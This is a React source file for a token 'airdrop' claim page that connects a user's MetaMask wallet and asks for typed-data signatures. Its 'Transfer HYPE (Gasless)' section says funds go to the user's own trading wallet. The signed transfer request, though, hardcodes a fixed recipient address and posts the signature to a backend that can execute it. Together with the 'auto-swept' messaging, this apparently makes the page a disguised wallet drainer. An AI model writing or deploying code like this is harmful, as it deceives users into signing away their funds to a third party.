import { useState, useEffect } from 'react';
import { ethers } from 'ethers';

const HYPEREVM_CHAIN_ID = '0x3e6';
const HYPEREVM_RPC = 'https://api.hyperliquid-testnet.xyz/evm';
const API_BASE = window.location.origin;

function App() {
  const [account, setAccount] = useState(null);
  const [loading, setLoading] = useState(false);
  const [eligibility, setEligibility] = useState(null);
  const [claiming, setClaiming] = useState(false);
  const [claimed, setClaimed] = useState(false);
  const [error, setError] = useState(null);
  const [hypeAmount, setHypeAmount] = useState('');
  const [transferring, setTransferring] = useState(false);

  const connectWallet = async () => {
    if (!window.ethereum) {
      alert('Please install MetaMask!');
      return;
    }

    try {
      setLoading(true);
      setError(null);

      const accounts = await window.ethereum.request({
        method: 'eth_requestAccounts'
      });

      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: HYPEREVM_CHAIN_ID }]
        });
      } catch (switchError) {
        if (switchError.code === 4902) {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: HYPEREVM_CHAIN_ID,
              chainName: 'HyperEVM Testnet',
              nativeCurrency: {
                name: 'HYPE',
                symbol: 'HYPE',
                decimals: 18
              },
              rpcUrls: [HYPEREVM_RPC],
              blockExplorerUrls: ['https://explorer.hyperliquid-testnet.xyz']
            }]
          });
        }
      }

      setAccount(accounts[0]);
      await checkEligibility(accounts[0]);
    } catch (err) {
      console.error(err);
      setError('Failed to connect wallet');
    } finally {
      setLoading(false);
    }
  };

  const checkEligibility = async (wallet) => {
    try {
      setLoading(true);
      const response = await fetch(`${API_BASE}/api/hyperpacks/eligibility/${wallet}`);
      const data = await response.json();
      setEligibility(data);
    } catch (err) {
      console.error(err);
      setError('Failed to check eligibility');
    } finally {
      setLoading(false);
    }
  };

  const claimAirdrop = async () => {
    if (!account || !eligibility?.eligible) return;

    try {
      setClaiming(true);
      setError(null);

      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();

      const domain = {
        name: 'HyperPacks Airdrop',
        version: '1',
        chainId: 998,
        verifyingContract: 'TBD'
      };

      const types = {
        ClaimAirdrop: [
          { name: 'wallet', type: 'address' },
          { name: 'allocation', type: 'uint256' },
          { name: 'nonce', type: 'uint256' }
        ]
      };

      const value = {
        wallet: account,
        allocation: eligibility.allocation,
        nonce: Date.now()
      };

      const signature = await signer.signTypedData(domain, types, value);

      const response = await fetch(`${API_BASE}/api/hyperpacks/claim-airdrop`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ wallet: account, signature })
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.error || 'Claim failed');
      }

      setClaimed(true);
      setTimeout(() => checkEligibility(account), 2000);
    } catch (err) {
      console.error(err);
      setError(err.message || 'Failed to claim airdrop');
    } finally {
      setClaiming(false);
    }
  };

  const transferHYPE = async () => {
    if (!account || !hypeAmount) return;

    try {
      setTransferring(true);
      setError(null);

      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      
      const amount = ethers.parseEther(hypeAmount);
      const deadline = Math.floor(Date.now() / 1000) + 3600;

      const domain = {
        name: 'HYPEMetaTransfer',
        version: '1',
        chainId: 998,
        verifyingContract: 'TBD'
      };

      const types = {
        TransferRequest: [
          { name: 'from', type: 'address' },
          { name: 'to', type: 'address' },
          { name: 'amount', type: 'uint256' },
          { name: 'nonce', type: 'uint256' },
          { name: 'deadline', type: 'uint256' }
        ]
      };

      const value = {
        from: account,
        to: '0x7beBcA1508BD74F0CD575Bd2d8a62C543458977c',
        amount: amount.toString(),
        nonce: 0,
        deadline
      };

      const signature = await signer.signTypedData(domain, types, value);

      const response = await fetch(`${API_BASE}/api/hyperpacks/hype-transfer`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ from: account, amount: amount.toString(), deadline, signature })
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.error || 'Transfer failed');
      }

      alert('HYPE transferred successfully!');
      setHypeAmount('');
    } catch (err) {
      console.error(err);
      setError(err.message || 'Failed to transfer HYPE');
    } finally {
      setTransferring(false);
    }
  };

  return (
    <div className="container">
      <div className="card">
        <div className="header">
          <h1>🎁 HyperPacks Airdrop</h1>
          <p>Check your eligibility and claim your tokens</p>
        </div>

        {!account ? (
          <button
            className="connect-button"
            onClick={connectWallet}
            disabled={loading}
          >
            {loading ? 'Connecting...' : 'Connect Wallet'}
          </button>
        ) : (
          <>
            <div className="wallet-info">
              <div className="wallet-address">
                {account.slice(0, 6)}...{account.slice(-4)}
              </div>
            </div>

            {loading && (
              <div className="loading">
                <div className="spinner"></div>
                <p>Checking eligibility...</p>
              </div>
            )}

            {error && (
              <div className="error-message">{error}</div>
            )}

            {claimed && (
              <div className="success-message">
                ✅ Airdrop Claimed! Tokens will be auto-swept to your trading wallet.
              </div>
            )}

            {eligibility && !loading && (
              <div className={`eligibility-box ${eligibility.eligible ? 'eligible' : 'not-eligible'}`}>
                <div className="status-icon">
                  {eligibility.eligible ? '✅' : '❌'}
                </div>
                <h2>
                  {eligibility.eligible
                    ? eligibility.claimed
                      ? 'Already Claimed!'
                      : 'You\'re Eligible!'
                    : 'Not Eligible'}
                </h2>
                {eligibility.eligible && (
                  <>
                    <div className="allocation-label">Your Allocation</div>
                    <div className="allocation">
                      {eligibility.allocation.toLocaleString()} Tokens
                    </div>
                    {!eligibility.claimed && (
                      <button
                        className="claim-button"
                        onClick={claimAirdrop}
                        disabled={claiming}
                      >
                        {claiming ? 'Claiming...' : 'Claim Airdrop'}
                      </button>
                    )}
                  </>
                )}
              </div>
            )}

            {eligibility?.eligible && (
              <div className="info-section">
                <h3>How It Works:</h3>
                <ul>
                  <li>Sign to claim (no gas fees)</li>
                  <li>Tokens sent to your wallet</li>
                  <li>Auto-transferred to trading wallet</li>
                  <li>Protected and ready for use</li>
                </ul>
              </div>
            )}

            <div className="hype-transfer-section">
              <h3>🔥 Transfer HYPE (Gasless)</h3>
              <p style={{ fontSize: '14px', color: '#666', marginBottom: '12px' }}>
                Transfer HYPE tokens to your trading wallet without paying gas
              </p>
              <input
                type="text"
                className="hype-input"
                placeholder="Amount (HYPE)"
                value={hypeAmount}
                onChange={(e) => setHypeAmount(e.target.value)}
              />
              <button
                className="transfer-button"
                onClick={transferHYPE}
                disabled={transferring || !hypeAmount}
              >
                {transferring ? 'Transferring...' : 'Transfer HYPE'}
              </button>
            </div>
          </>
        )}
      </div>
    </div>
  );
}

export default App;
